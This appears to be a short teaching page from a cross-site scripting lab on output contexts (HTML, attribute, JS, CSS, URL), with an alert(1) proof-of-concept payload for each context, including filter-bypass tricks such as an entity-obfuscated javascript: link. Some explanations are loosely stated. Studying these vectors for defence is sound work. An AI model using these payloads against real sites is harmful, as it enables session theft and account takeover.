<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>XSS Contexts</title>
    <style>
        :root{--bg:#0d0f17;--surface:#13151c;--text:#a0a8b8;--accent:#7aa2f7;--border:#24283b;--cyan:#7dcfff;--green:#9ece6a;--yellow:#e0af68;}
        *{box-sizing:border-box;margin:0;padding:0;}
        body{font-family:"Cascadia Code","Fira Mono",Consolas,monospace;background:var(--bg);color:var(--text);font-size:14px;line-height:1.6;min-height:100vh;}
        .bar{background:var(--surface);border-bottom:1px solid var(--border);padding:8px 16px;display:flex;justify-content:space-between;position:sticky;top:0;z-index:10;}
        .bar span{color:var(--accent);}
        .wrap{max-width:960px;margin:auto;padding:2rem 1rem;}
        .prompt{color:var(--green);}.cmd{color:var(--yellow);}
        h1,h2,h3{color:var(--accent);margin-top:1.5rem;margin-bottom:.5rem;}
        h1{font-size:1.4rem;}h2{font-size:1.2rem;}h3{font-size:1.05rem;}
        code{background:var(--surface);border:1px solid var(--border);padding:2px 4px;border-radius:3px;color:var(--yellow);font-size:13px;}
        pre{background:var(--surface);border:1px solid var(--border);border-radius:4px;padding:.75rem 1rem;overflow-x:auto;margin:.5rem 0;}
        ul{margin-left:1.2rem;margin-top:.5rem;}li{margin-bottom:.25rem;}
        footer{text-align:center;padding:2rem 0;color:var(--cyan);font-size:12px;}
    </style>
</head>
<body>
<div class="bar"><span>user@lab</span><span>~/xss/02-contexts</span></div>
<main class="wrap">
    <h1>Output Contexts & Why They Matter</h1>

    <h2>What “context” means</h2>
    <p>Browser parsers treat the same characters differently inside HTML, JS, CSS, URL, or JSON. Wrong escaping = parser switches context → code execution.</p>

    <h2>Root cause</h2>
    <p>Each context has its own meta-characters: HTML uses &lt;, JS uses ', CSS uses ", URLs use :, JSON uses ". Encoding must target the *active* meta-char set.</p>

    <h2>Real-world spots</h2>
    <ul>
        <li>HTML body: comment text, user card</li>
        <li>Attribute: href, src, data-*</li>
        <li>JS: inline JSON, template literals</li>
        <li>CSS: dynamic theme color</li>
        <li>URL: returnTo, next, redirect</li>
    </ul>

    <h2>Impact</h2>
    <p>Break one context → jump into another (HTML → JS → URL) and you bypass multiple “secure” filters in a single payload.</p>

    <h2>Mini case-study</h2>
    <p>2021 Gmail: developer escaped HTML but not JS context inside data-json= attribute → stored XSS via contact name.</p>

    <h2>Payloads per context</h2>
    <!-- HTML → no quotes needed -->
    <pre>// Inside &lt;div&gt;...USER...&lt;/div&gt;  →  direct exec<code>
&lt;svg&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;/svg&gt;</code></pre>

    <!-- Attribute back-tick trick -->
    <pre>// data-json="{&quot;x&quot;:`${alert(1)}`}"<code>
// Back-tick allows template literal injection
&lt;div data-json="{&quot;x&quot;:`${alert(1)}`}"&gt;</code></pre>

    <!-- JS string break -->
    <pre>// var msg = `Welcome ${name}`;
// name = "${alert(1)}"<code>
var msg = `Welcome ${alert(1)}`;</code></pre>

    <!-- URL unicode protocol -->
    <pre>// jav&#x61;script:  →  browser normalises to javascript:<code>
&lt;a href="jav&#x61;script:alert(1)"&gt;click&lt;/a&gt;</code></pre>

    <!-- CSS expression() -->
    <pre>// Legacy IE + quirks mode<code>
@import 'data:text/css,*{x:expression(open(alert(1)))}';</code></pre>

    
</main>
<footer><span>EOF ── happy hacking :)</span></footer>
</body>
</html>